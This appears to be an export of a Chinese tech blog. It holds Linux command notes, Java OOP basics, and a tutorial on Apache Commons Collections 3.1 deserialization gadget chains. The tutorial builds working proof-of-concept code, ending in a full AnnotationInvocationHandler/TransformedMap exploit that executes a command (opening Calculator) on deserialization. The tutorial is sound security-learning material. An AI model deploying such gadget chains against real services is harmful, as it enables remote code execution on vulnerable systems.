5//图形化纯命令行界面切换init 0 //关机 init 6//重启runlevelstartx //无需登录切换tty //终端号\n\nid -u //查看当前用户id，0为管理员uname -r //内核版本lscpu //cpu型号free -h //空闲内存cat /proc/meminfo //空闲内存lsblk //硬盘大小mii-tool ens33 //查看网卡信息cat /etc/shells //查看全部shellhostname //主机名enable cmd //启用内部命令，内部命令优先级高于外部enable -n cmd //禁用内部命令\n\n 命令执行过程：外部命令先根据$PATH找存储位置，而后放入hash表缓存，下次使用直接从hash表找路径\nhash //缓存hash -d name //清除name缓存hash -l //可看到别名hash -p path name //起别名hash -t name//显示路径hash -r//清除缓存\n\n\nLinux文件管理Linux 系统目录结构FHS​    FHS 全称（Filesystem Hieratchy Standard）中文名文件系统结构层次，定义了Linux操作系统中的主要目录和目录结构。\n\n\n\n目录\n描述\n\n\n\n/\n根目录\n\n\n/bin\n放置可执行文件，如ls命令等\n\n\n/boot\n引导程序文件，内核，以及 initrd 等文件\n\n\n/dev\n设备文件，比如磁盘设备\n\n\n/etc\n系统范围的配置文件\n\n\n/home\n用户 home 目录，个人用户的配置\n\n\n/media\n可移除的媒体，cd-rom 等的挂载点\n\n\n/lib 和 /lib64\n/bin 和 /sbin 中用到的库文件存放位置\n\n\n/mnt\n临时挂载点，U盘等\n\n\n/opt\n可选的应用包，一般用于存放一些直接提供二进制程序的非开源包\n\n\n/proc\n虚拟文件系统\n\n\n/root\nroot 用户的 home 目录\n\n\n/run\n存放一些 pid 和 socket 文件\n\n\n/sbin\n系统的可执行文件，init ，mount 等\n\n\n/sys\n非FHS标准，但是大部分发行版都有，虚拟文件系统，用来对内核和设备驱动做设置\n\n\n/usr\nUnix Software Resource 绝大多数的程序和应用工具安装在这里，结果和/非常相似\n\n\n/usr/bin\n对应的可执行文件\n\n\n/usr/lib\n对应的库文件\n\n\n/usr/share\n和计算机无关的共享资源文件\n\n\n/usr/src\n源代码存放路径，如Linux 内核源码\n\n\n/var\n在程序运行中内容不断变化的文件，比如日志\n\n\n/tmp\n临时文件系统，重启后内容丢失\n\n\n服务管理方式\n\n\n命令\n说明\n\n\n\nsystemctl status crond\n查看某个服务的状态\n\n\nsystemctl start crond\n启动某个服务\n\n\nsystemctl stop crond\n停止某个服务\n\n\nsystemctl enable crond\n设置某个服务开机启动\n\n\nsystemctl disable crond\n移除某个服务开机启动\n\n\nsystemctl restart crond\n重启某个服务\n\n\n日志与日志管理方式​    日志是由程序在运行过程中打印出来的一些执行流程或者记录信息的文本，Systemd 同样也提供了对日志访问的方式\n\n\n\n命令\n说明\n\n\n\njournalctl -x\n查看日志\n\n\njournalctl -xe\n跳到尾部查看日志\n\n\njournalctl -u crond.service\n查看crond服务的日志\n\n\n​    通过直接查看文本的方式查询\n\n\n\n日志路径\n说明\n\n\n\n/var/log/message\n全局系统日志，包括登录，对服务启停认证等\n\n\n/var/log/lastlog\n不是一个文本文件，需要 lastlog 命令读，保存了最近的用户登录信息\n\n\n/var/log/yum.log\n最近通过yum 安装的程序的日志\n\n\n/var/log/cron\n定时任务日志\n\n\n/var/log/boot.log\n启动日志\n\n\n/var/log/kern\n内核日志，也可以通过 dmesg 查看\n\n\n\nLinux磁盘管理磁盘结构和概念设备文件​    设备在Linux内有很多文件，不同文件的开头各有不同，对应的设备也不同。\nl/O Ports: I/O设备地址\n​    一切皆文件：open(), read(), write(), close()\n设备类型​    块设备：block，存取单位“块”,磁盘（通常具有缓存，而且是随机的；大部分表现为物理上看的见的设备；）\n​    字符设备：char，存取单位 “字符”，键盘（具有一定的顺序；大部分表现为逻辑上的设备例如：null、zero、tty）\n\n​    上述两个设备存放的不是大小，而是两个数字；前者是设备的主要编号（类别），后者是设备的次要编号（序号）。\n​    设备文件：关联至一个设备驱动程序，进而能够跟与之对应硬件设备进行通信。\n​    主设备号：major number,标识设备类型\n​    次设备号：minor number,标识同一类型下的不同设备\n​    当设备名对应的主要编号和次要编号相同时，那么代表的是同一个设备。\n​    设备的名称可人为指定。操作：（cp -a /dev/null）\n\n\nLinux基本命令alias test=“xxx”//别名echo &quot;$PATH&quot;//弱引用变量会替换echo &#x27;$PATh&#x27;//强引用变量不会替换echo `ls`//执行命令\n\n","categories":["Linux学习基础篇"],"tags":["Linux","运维","操作系统"]},{"title":"Java安全从零到一(8)-Commons Collections POP Gadget Chains简介","url":"/2023/02/18/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-8-Commons-Collections-POP-Gadget-Chains%E7%AE%80%E4%BB%8B/","content":"写在之前​    其实对于基础，真的太多太多了，需要学习的也很多，如果真的可以坚持全部做下来，其实对Java语言基础理解应该是足够的。而本人在写了前面的Java基础的博客后，确实对代码的理解更加通顺了一些。但确实过程很漫长，光第二篇基础就写了5W多，加上需要对代码的理解，所以可以把第二篇当作知识库，需要的时候查阅即可。当然，全部读懂肯定更好。本篇会从CC链中的TransformedMap和LazyMap两条链子入手，希望本人可以搞懂，如有不正确的也欢迎指出🙏\n环境与流程相关​    复现环境是 IntelliJ IDEA + jdk1.7.080 + Apache Commons Collections 3.1\n\n首先我们需要一个 Apache Commons Collections » 3.1 的 Jar 包 , 可以从  MVNRepository 上获取到它.\n\n然后打开 IntelliJ IDEA , 创建一个普通的 Java 项目 , 注意 JDK 版本需要为 1.7\n\n导入之前下载的 commons-collections-3.1.jar 包 ,\n\n\n流程分析org/apache/commons/collections/functors/InvokerTransformer.class\nInvokerTransformer.class 类中的 Transformer() 方法中存在一组反射调用 , 这组反射调用是漏洞产生的根源.\n\n\n​    这是我们以前的例子，我们拿出来放在这里对比\nimport java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class test &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;        Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;);        Method method = cls.getMethod(&quot;getRuntime&quot;);        Object obj = method.invoke(null);        Method exec = cls.getMethod(&quot;exec&quot;,String.class);        Process process =(Process) exec.invoke(obj,&quot;open /System/Applications/Calculator.app&quot;);    &#125;&#125;\n\n\n​    对比一下 , 只要我们能控制 input , this.iMethodName , this.iParamTypes , this.iArgs 四个参数 , 那么就可以通过这组反射调用执行任意代码 !\n\n那么这些参数是否可控呢 ? 回顾 InvokerTransformer.class 类的构造函数 , 可以发现 this.iMethodName , this.iParamTypes , this.iArgs 三个参数都是直接可控的 , 我们可以直接传入参数值 , 而 input 参数是 transform() 函数调用方传入的 , 同样可控 .\n\n​    下图为InvokerTransformer的构造方法，可以发现iMethodName, iparamTypes, iArgs三个参数均直接可控.\n\n​    而input参数是transform()参数传入的，同样可以控制\n\n\n那么基于这些信息，我们写一个最简单的利用方式\n\nimport org.apache.commons.collections.functors.InvokerTransformer;/*transformer利用链，仅本地 */public class easyPoc &#123;    public static void main(String[] args) &#123;        InvokerTransformer t1 = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;);        t1.transform(Runtime.getRuntime());    &#125;&#125;\n\n\n\n虽然可以成功执行命令 , 但是这种攻击方式肯定是没有意义的 , 我们构造代码是为了在远端服务上执行 , 而并非在本地服务器上执行 . 远程服务器上肯定不会出现像 t1.transform(Runtime.getRuntime()); 这样的代码 . 所以我们必须对上述代码做优化 , 减少反序列化后的操作 .\n\n​    优化代码的第一步就是消除transform() 方法的参数限制 : Runtime.getRuntime().\norg/apache/commons/collections/functors/ChainedTransformer.class\n消除上述限制的最好方法就是通过 Java 反射机制来构建 java.lang.Runtime.getRuntime().exec() 方法调用链 . 由于 Runtime.class 构造函数的特殊性 , 我们在编写 Java 反射代码时至少要调用 getMethod() , getRuntime() , exec() , invoke() 四个方法 . 因此 , 一组反射是完全不够用的 , 我们必须要找到一条链 , 来拼接多组反射 , 从而实现命令执行 .\nChainedTransformer.transform() 方法恰好符合这个要求.\n\n\n\n​    ChainedTransformer 类的构造函数返回一个 Transformer[] 类型的数组this.iTransformers . 该类的 transform() 方法会循环获取 this.iTransformers 数组中的每一项 , 调用它的 transform() 方法 , 并将返回结果作为下次循环调用的参数 .\n​    请注意，这里的transform()方法非常重要，后续transformer利用链基本上都围绕它展开，这里的意思是，每次都从iTransformers[ ]数组中拿一个，假定此处为iTransformers[1]，执行transform(a)，transform返回的是一个a.iTransformers[1]( )，然后继续拿这个对象再去从iTransformers[ ]数组中取出第二个，以此循环\n​    举个例子，我们这里想要的是Runtime.getRuntime.exec( )\n​    所以 , 我们可以编写多个 InvokerTransformer 实例对象 , 分别获取 getRuntime() , invoke() , exec() 方法 , 然后将这些实例对象添加到 this.iTransformers 数组中 , 从而获得一条完整的调用链 .\nimport org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.Serializable;import java.util.HashMap;import java.util.Map;public class EvalObject implements Serializable &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                                //反射调用getMethod方法,然后getMethod方法再反射调用getRuntime方法, 返回Runtime.getRuntime()方法                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),                //反射调用exec方法                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;open /System/Applications/Calculator.app &quot;&#125;)        &#125;;    &#125;&#125;\n\n​    那么如何获取 java.lang.Runtime 实例对象 , 来开启这个调用链呢 ?\norg/apache/commons/collections/functors/ConstantTransformer.class\n目前的问题是如何获取 Runtime 实例对象 . 而 ConstantTransformer.transform() 方法满足我们的需求 .\n\n\n​    ConstantTransformer.transform() 方法恰好会返回 Runtime() 实例对象 , 因此我们只需要将 Runtime.class 传入 ConstantTransformer 的构造方法中即可 .\nTransformer[] transformers = new Transformer[]&#123;        //传入Runtime类        new ConstantTransformer(Runtime.class),        //反射调用getMethod方法,然后getMethod方法再反射调用getRuntime方法, 返回Runtime.getRuntime()方法        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),        //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),        //反射调用exec方法        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;open /System/Applications/Calculator.app &quot;&#125;)&#125;;\n\n​    至此 , transform( ) 方法的参数限制已经被去除 , 此时无论 transform( ) 方法的参数是什么 , 都会执行 java.lang.Runtime.getRuntime( ).exec( ) 调用链 , 实现命令执行.\nimport org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.io.Serializable;public class EvalObject_1 implements Serializable &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                //传入Runtime类                new ConstantTransformer(Runtime.class),                //反射调用getMethod方法,然后getMethod方法再反射调用getRuntime方法, 返回Runtime.getRuntime()方法                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),                //反射调用exec方法                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;open /System/Applications/Calculator.app &quot;&#125;)        &#125;;        Transformer transformerChain = new ChainedTransformer(transformers);        transformerChain.transform(&quot;mes9s0&quot;);    &#125;&#125;\n\n详细分析\n​    这个地方可能要注意，第一个InvokerTransformer反射调用的是getMethod方法，而不是getRuntime方法, 是通过反射调用的getMethod方法，再次反射调用getRuntime方法，才返回的Runtime.getRuntime( )方法：\n\n\n​    此时可以看见传入的是java.lang.Runtime\n\n​    进入transform\n\n\n​    我们看到获取到的实际是\n\n​    那么这句返回的其实是java.lang.reflect.Method的对象.invoke( java.lang.Runtime , getRuntime)\n​    这儿返回的是Java.lang.Runtime.getRuntime( )了\n\nTransform()方法的利用条件​    上一步 , 我们通过 java 反射机制消除了 transform() 方法的参数限制 . 但是依旧需要手动触发 transform() 方法 , 这样的场景是比较少的 .\n​    根据 Java 反序列化漏洞的定义 , 我们更加期望后端程序在执行 readObject() 方法时就会自动执行 transform() 方法.\n​    综上所述 , 为了实现完整的利用链 , 必须要达成如下两个目标 :\n\n找到一个 tansform() 方法 , 该方法所属的实例对象是可控的.\n找到一个重写的 readObject() 方法 , 该方法会自动调用 transform() 方法.\n\n​    这个限制是非常严谨的 , 目前研究人员共发掘出了两条攻击链 , 也就是经典的 TransformedMap攻击链 和 LazyMap攻击链\nTransformedMap攻击链​    Apache Commons Collections 实现了一个 TransformedMap 类，该类是对 Java 标准数据结构 Map 接口的一个扩展 .\n​    该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换 , 具体的变换逻辑由Transformer 类定义，Transformer 在 TransformedMap 实例化时作为参数传入.\n\nTransformedMap.checkSetValue()​    TransformedMap 类的 checkSetValue() 方法中调用了 Transform() 方法 .\n\n​    只要我们能控制 this.valueTransformer , 那么就可以利用该方法执行 ChainedTransformer.transform() 方法 , 进入构造好的函数调用链 . 根据上文可以得知 , this.valueTransformer 会在 TransformedMap 类被实例化时被传入 .\n​    由于 TransformedMap 类的构造方法通过 protected 修饰符修饰 , 所以无法在外界获得 TransformedMap 实例对象 . 对此 , 该类提供了 decorate() 方法来返回 TransformedMap 实例对象 , 而 decorate() 方法通过 public 修饰符修饰 , 外界可以直接调用 .\n​    综上所述 , this.valueTransformer 是完全可控的 . 我们可以通过这里调用 ChainedTransformer.transform() 方法\nTransformedMap.decorate()\n​    Map : 需要转换的 Map 对象\n​    KeyTransformer : 用于转换键的转换器 , 如果为 null 则表示不进行转换\n​    ValueTransformer : 用于转换值的转换器 , 如果为 null 则表示不进行转换\n​    既然要调用 TransformedMap.decorate() 方法 , 那么这里 ValueTransformer 就应为 ChainedTransformer . 此外 , 我们还需要一个 Map类型的变量 , 而获取 Map 最简单的方式就是构造一个 HashMap , 然后将该 Map 实例对象传入 decorate() 方法中.\n​    因此 , 我们需要构造如下代码 :\n//创建Map并绑定transformerChainMap innerMap = new HashMap();//初始化HashMapinnerMap.put(null,null);//调用decorate()方法Map outerMap = TransformedMap.decorate(innerMap,null,transformerChain);\n\n\n​    那么现在还剩一个问题 : 如何调用 checkSetValue() 方法呢? 要知道该方法同样通过 protected 修饰符修饰 , 外界是无法直接调用的 .\nAbstractInputCheckedMapDecorator$MapEntry.setValue()​    transformedMap 的父类 AbstractInputCheckedMapDecorator 中存在一个静态内部类 MapEntry , 该类 setValue() 中调用了 checkSetValue() 方法.    \n\n​    我们现在的目标是调用 TransformedMap.checkSetValue() 方法 , 因此只需要令 this.parent 指向 TransformedMap 实例对象即可 . 查看 MapEntry 内部类的构造函数 , 可以确定 this.parent 参数值是作为参数传入的 . 是可控的 .\nAbstractInputCheckedMapDecorator$EntrySetIterator.next()​    我们对 this.parent = parent 打断点 , 查看 parent 参数值的函数调用栈 .\n\n​    可以看到 , AbstractInputCheckedMapDecorator 类的静态内部类 EntrySetIterator 中的 next() 方法触发了 MapEntry 内部类的构造函数 , 并传入 parent 参数值 . 最后返回 AbstractInputCheckedMapDecorator$MapEntry 实例对象 .\n\nAbstractInputCheckedMapDecorator$EntrySet.iterator()​    这里 this.parent 参数依旧是可控的 ,我们继续跟踪 this.parent = parent ,\n\n​    可以看到 , AbstractInputCheckedMapDecorator 类的静态内部类 EntrySet 中的 iterator() 方法触发了 EntrySetIterator 内部类的构造函数 , 并且传入 parent 参数. 最后返回 AbstractInputCheckedMapDecorator$EntrySetIterator 实例对象.\nAbstractInputCheckedMapDecorator.entrySet()​    依旧没看到 this.parent 的控制点 , 我们继续追踪 this.parent = parent .\n\n​    这里会根据 isSetValueChecking() 方法的返回值决定是否调用 AbstractInputCheckedMapDecorator.EntrySet() 方法 .\n​    而抽象类 AbstractInputCheckedMapDecorator 恰好是 TransformedMap 的父类 , 因此这里我们可以直接将 this 指向 TransformedMap . 使得最后调用 TransformedMap.checkSetValue() 方法 .\nTransformedMap.isSetValueChecking()​    那么现在还剩最后一个问题 : 我们需要让 isSetValueChecking() 方法的返回值为 True\n​    TransformedMap 实现了抽象父类的 isSetValueChecking( ) 方法 , 来看一下函数定义\n\n​    只需要让 this.valueTransformer 不会空即可 ! 这当然是成立的 , 我们在将 TransfromedMap.decorate() 方法时已经将 ChainedTransformer 赋值给了 this.valueTransformer\n本地命令执行POC​    我们上面所有提到的方法调用构成了一个闭环 , 我们只需要获取 AbstractInputCheckedMapDecorator$MapEntry 实例对象并手动触发 setValue() 方法 , 就可以执行任意代码 .\nimport org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.Serializable;import java.util.HashMap;import java.util.Map;public class EvalObject implements Serializable &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                //传入Runtime类                new ConstantTransformer(Runtime.class),                //反射调用getMethod方法,然后getMethod方法再反射调用getRuntime方法, 返回Runtime.getRuntime()方法                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),                //反射调用exec方法                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;open /System/Applications/Calculator.app &quot;&#125;)        &#125;;        //将transformers数组存入ChaniedTransformer这个继承类        Transformer transformerChain = new ChainedTransformer(transformers);        //创建Map并绑定transformerChain        Map innerMap = new HashMap();        innerMap.put(&quot;value&quot;, &quot;value&quot;);        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);        //触发漏洞        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();        onlyElement.setValue(&quot;mes9s0&quot;);    &#125;    ;&#125;\n\n用到一些逆推的思想 , 说明了函数调用链是如何构造的 . 至此 ,  POC 就构造完毕了 .\n\n延长攻击链annotation/AnnotationInvocationHandler.readObject()​    这个 POC 是不完善的，因为这个 POC 压根没法投入使用 ! 我们最终的目标是让上文构造的恶意类在远程服务器上执行 , 也就是让恶意类经过序列化/反序列化后直接执行 .\n​    我们的目标是找到一个重写 readObject() 方法的地方 . 该方法中会调用可控的 setValue() 方法 . 那么是否存在这样的地方呢 ? 在 Jdk1.7 中 , annotation/AnnotationInvocationHandler 类的 readObject() 方法实现了我们的需求 .\n\n1​    要想调用 AbstractInputCheckedMapDecorator$MapEntry.setValue() 方法 , 第一步要达成如下三个条件 .\n\nvar5 = AbstractInputCheckedMapDecorator$MapEntry\n\n!var7.isInstance(var8)\n\n!(var8 instanceof ExceptionProxy) == True\n\n\n​    var7 的值通过 var3.get(var6) 返回 , 且不能为空 .\n​    var6 和 var8 的值比较好看 , 分别通过 var5.getKey() 方法和 var5.getValue() 方法获取 var5 的键名与值.\n​    var5 是 var4.next() 方法返回的 , 根据上文的内容 , 我们希望 var4 为 AbstractInputCheckedMapDecorator$EntrySetIterator实例对象.\n2​    从第一步的结果来看 , 我们需要知道 var3 和 var4 的赋值过程 .\n​    1. Iterator var4 = this.memberValues.entrySet().iterator()\n​    2. Map var3 = var2.memberTypes();\n​    var4 是 this.memberValues.entrySet().Iterator() 方法返回的 , 对比前面的 POC , 我们期望 this.memberValues 指向 TransformedMap .\n​    var3 是 var2.memberTypes() 方法返回的 , 我们跟踪该方法 .\n\n\n\n​    通过几步跳转 , 可以确定这里 var3 是一个 HashMap , 因此上文 var3.get() 就是调用 HashMap.get() 方法.\n3​    现在需要关注 this.memberValues 与 var2 的值了 . 其中 var2 的赋值如下 :\n\n​    为了确定 this.type 和 this.memberValues 的值 , 我们来看一下当前类构造函数的定义 .\n\n​    AnnotationInvocationHandler 的构造函数第二个参数类型为 Map , 这点非常巧 , 我们可以直接传入 TransformedMap 实例对象.\n​    var1是一个注解类\n​    注意 : 这里 var1 , var2 是构造函数的形式参数 , 并非 readObject() 方法中的 var1 和 var2！\n4​    再次注意，这里 var1 , var2 是 readObject() 方法中的形式参数.\n\n构造函数 AnnotationInvocationHandler.AnnotationInvocationHandler()\n\n\n​    这里 this.type 被赋值为 java.lang.annotation.Retention\n\nvar2 = AnnotationType.getInstance(this.type)\n\n\n​    经过这步赋值 , var2 实例对象中的 memberTypes 参数变为一个 HashMap , 其中存在键值对 : {“value” : “java.lang.annotation.RetentionPolicy”}\n\nClass var7 = (Class)var3.get(var6)\n\n\n​    这里调用了 var3.get(var6) , 并将结果赋值给变量 var7 , var3 是一个 HashMap , var6 值为 “value” , 所以实际执行的是 HashMap.get(“value”) . 而 var3 中恰好存在名为 “value” 的键名 , 因此可以把 “value” 的值 “java.lang.annotation.RetentionPolicy” , 赋值给变量 var7.\n​    这样变量 var7 就不为空了 , 自然通过了下文 if (var7 != null) 的条件判断 .\n\n综上所述 , 由于变量 var6 的值为 value , 因此变量 var7 可以获取到值并通过下面的条件判断 . 而 var6 的值又是通过 var5.getKey() 获取的 , 而 var5 就是我们代码中创建的 HashMap\n\n\n​    因此这里也引出了该 POC 利用成功的一个核心要求 : 手工创建的 HashMap 的键名必须为 Value .\n​    相反 , 如果这里 HashMap 的键名被赋予其他值( 例如 “mes9s0” ) , 那么此处将执行 HashMap.get(“mes9s0”) , 哈希表中不存在这个键名 , 因此 var7 会被赋值 null , 不会通过下面的 if 条件判断 .\n\n后面就没啥好说的, 程序将执行到 var5.setValue() , 即执行 AbstractInputCheckedMapDecorator$MapEntry.setValue() 方法 , 进入恶意函数调用链 .\n\n\n​    至此 , 当我们构造的恶意类在远程服务器通过 readObject() 方法进行反序列化时 , 会自动调用 AbstractInputCheckedMapDecorator$MapEntry.setValue() 方法 , 进入我们构造好的恶意函数调用链 , 最终执行任意代码 .\n反序列化命令执行POC​    现在可以构造完整的 POC 了 . 我们仅需要获取 AnnotationInvocationHandler 实例对象 , 并向构造函数中传入Retention类 与 TransformedMap实例对象 , 即可实现POP攻击链自动调用 .\n​    需要注意的是 , AnnotationInvocationHandler类的构造函数使用了默认修饰符 , 通过默认修饰符修饰的方法只能同包访问 , 因此这里无法直接访问 .\n\n​    这里与获取 java.lang.Runtime 实例对象的思路类似 , 即通过反射来获取类 , 通过 **getDeclaredConstructor()**方法获取构造器 , 通过 setAccessible() 方法来开放构造器访问权限.\n\nimport org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class highPoc_transform &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        org.apache.commons.collections.Transformer[] transformers = new Transformer[]&#123;                //此处Tranformer数组里面的值是三个对象，是因为ChainedTransformer里可以循环调用，并把上一层传给下一层                //传入Runtime类                new ConstantTransformer(Runtime.class),                //pass                /*反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，                返回Runtime.getRuntime方法                 */                new InvokerTransformer(&quot;getMethod&quot;,                        new Class[]&#123;String.class, Class[].class&#125;,                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                /*                反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，                返回Runtime实例化对象                 */                new InvokerTransformer(&quot;invoke&quot;,                        new Class[]&#123;Object.class, Object[].class&#125;,                        new Object[]&#123;null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;,                        new Object[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)        &#125;;        org.apache.commons.collections.Transformer transformerChain = new ChainedTransformer(transformers);//        transformerChain.transform(&quot;mes9s0&quot;);/*        //此处往下为本地POC，无法远程反序列化        //创建Map并绑定transformerChain        Map innerMap = new HashMap();        //初始化HashMap        innerMap.put(null,null);        //调用decorate()方法        Map outerMap = TransformedMap.decorate(innerMap,null,transformerChain);        //触发漏洞        //获取AbstractInputCheckedMapDecorator$MapEntry        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();        onlyElement.setValue(&quot;mes9s0&quot;);*/        Map map = new HashMap();        map.put(&quot;value&quot;, &quot;2&quot;);        Map transformedmap = TransformedMap.decorate(map, null, transformerChain);        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);        cons.setAccessible(true);        Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap);        ByteArrayOutputStream exp = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(exp);        oos.writeObject(ins);        oos.flush();        oos.close();        ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());        ObjectInputStream ois = new ObjectInputStream(out);        Object obj = (Object) ois.readObject();        ois.close();    &#125;&#125;\n\n\n","categories":["Java安全基础篇"],"tags":["开发","Java","安全","CC","POP Gadget Chains"]},{"title":"Java安全从零到一(2)-Java面向对象编程","url":"/2022/03/19/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-2-Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/","content":"类与对象​    考虑的是标准的模块化设计，使用的时候根据标准进行拼装。面向对象主要有三个特性：封装性，内部操作对外部不可见，内部的操作不可以直接使用时才是安全的；继承性，在已有结构的基础上扩充新功能；多态性，继承性的基础上扩充的概念，指的是类型的转换处理。实际开发中三步：OOA,面向对象分析；OOD,面向对象设计；OOP,面向对象编程。\n​    什么是类：类是对某一类事物的抽象概念；什么是对象：对象描述的是一个具体的产物。具体就是类是模版，对象是实例。类由成员属性和操作方法组成。概念写得很抽象，写点代码就知道了。\n​    产生对象的方法：\n​    1、声明并实例化对象：类名称 对象名称 = new 类名称()\n​    2、分步：\n​            声明对象：类名称 对象名称 = null;\n​            实例化对象：对象名称 = new 类名称();\n​    调用已经实例化对象：\n​            1、对象名称.对象属性\n​            2、对象名称.对象方法()\n​    代码中一定要声明且实例化对象后才可以调用，如果未声明，相当于未在堆内存中开辟所产生问题，只有引用数据（类，接口，数组）类型存在此问题。\n\n对象内存分析​    堆内存：保存的是对象的具体信息，在程序之中堆内存空间的开辟是通过new完成的；栈内存：保存的是一块堆内存的地址。通过地址找到堆内存，再找堆内存里的信息。    \n\n对象引用分析​    内存引用传递：同一块堆内存可以被不同的栈内存所指向，也可以更换指向。\nPerson per1 = new Person();per1.name = &quot;test&quot;;Person per2 = per1；//引用传递per2.name = &quot;haha&quot;;\n\n\n​    引用发生在主方法或者方法之中，修改的都是堆内存中存储的信息，不同的是，程序执行完毕，方法会断开链接。引用传递发生在方法上一定要观察方法的参数类型，也要看方法的执行过程。\n引用垃圾产生简单分析​    垃圾空间就是所有的未被栈内存只向的堆内存空间，垃圾空间将会被GC不定期进行回收并且释放内存空间。\nPerson per1 = new Person();Person per2 = new Person();per1.name = &quot;test1&quot;;per2.name = &quot;test2&quot;;per2 = per1；per2.name = &quot;test3&quot;//per1.name也被改为了test3\n\n​    上述per2的堆内存空间即变为垃圾空间。\n\n成员属性封装​    类的组成是属性和方法，方法提供服务，所以一般不会封装。而属性需要较高的安全性，一般对其封装保护（private关键字）。属性一旦封装后外部不可见，对类的内部可见，外部想要访问，按如下方式：\n​    设置或者取得属性可以使用setXXX(),getXXX()方法，private String name为例:设置属性方法:public void setName(String n){};获取属性方法：public String getName(){return name}。\n​    开发中定义类的属性时候，一定要用private封装，并且提供getter，setter方法。\n\n构造方法与匿名对象​    按照上面的方法来看，如果要设置初始化属性，假如说类中的属性有很多个需要设置，那么要调用很多次getter，setter方法。那么就出现了构造方法。可以通过构造方法实现实例化对象中的属性初始化处理（new的时候构造方法）。\n​    构造方法：1、方法名称必须与类名称保持一致；2、构造方法不允许设置任何的返回值类型；3、构造方法是在使用关键字new实例化对象的时候自动调用的。\nClass Person&#123;  private String name;  private int age;  public Person(String s,int i)&#123;    name = s；    age = i；  &#125;  public void tell()&#123;    sout(&quot;姓名： &quot;+name+&quot;、年龄： &quot;+ age);  &#125;&#125;public class Test &#123;  psvm&#123;    Person per = new Person(&quot;test1&quot;,23);    per.tell;  &#125;&#125;\n\n​    